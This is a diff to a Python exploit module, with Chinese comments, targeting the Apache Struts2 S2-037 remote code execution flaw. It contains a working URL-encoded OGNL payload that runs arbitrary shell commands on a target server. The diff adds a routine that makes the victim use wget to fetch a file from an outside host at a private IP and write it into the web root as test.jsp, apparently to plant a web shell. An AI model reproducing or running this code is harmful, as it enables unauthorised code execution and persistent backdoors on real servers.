@@ -3,15 +3,15 @@ import sys
 from exp_template import Exploit, Level, session
 
 """
-构造函数需要传递一下参数
+构造函数需要传递以下参数
 url   测试目标的url
 exp需要实现的方法为meta_info和exploit
 create by swm  2018/06/21
 done:
 获取webpath
-执行shell命令，无法执行echo命令
-to do：
-通过漏洞写文件
+执行shell命令，无法执行echo命令写文件
+can do:
+执行wget下载文件，下载大文件都行
 """
 
 
@@ -21,8 +21,7 @@ class S2037(Exploit):
         return {
             'name': 'S2-037EXP',
             'author': 'swm',
-            'date': '2018/06/21',
-            'reference': 'S2-037.docx'
+            'date': '2018/06/21'
         }
 
     # 判断当前网页是否存在漏洞
@@ -62,14 +61,13 @@ class S2037(Exploit):
             self.report("Fail to get web file path {}".format(pathurl))
             return False
 
-    def executecmd(self):
-        command = "whoami"
+    def executecmd(self, cmd):
         cmdexp = "/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parame" \
                  "ters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Run" \
                  "time@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23" \
                  "wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServ" \
                  "letResponse&content=16456&command={}"
-        commandurl = self.url+cmdexp.format(command)
+        commandurl = self.url+cmdexp.format(cmd)
         s = session()
         try:
             r = s.get(commandurl, timeout=5)
@@ -78,6 +76,11 @@ class S2037(Exploit):
         except:
             return False
 
+    def wgetfile(self, serverurl, filepath):
+        cmd = ''' wget {} -O {}test.jsp'''.format(serverurl, filepath)
+        response = self.executecmd(cmd)
+        return response
+
     def exploit(self):
         if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
             self.report('url error', Level.error)
@@ -85,10 +88,13 @@ class S2037(Exploit):
         poc = self.pocurl()
         if poc:
             # 获取webapp的根目录
-            # webpath = self.getwebpath()
-            # if webpath:
-            res = self.executecmd()
-            return res
+            webpath = self.getwebpath()
+            if webpath:
+                serverurl = '''http://172.22.209.33:8014/api/download'''
+                res = self.wgetfile(serverurl, webpath)
+                if res:
+                    self.report('wget file {}'.format(res), Level.info)
+        return True
 
 
 if __name__ == '__main__':
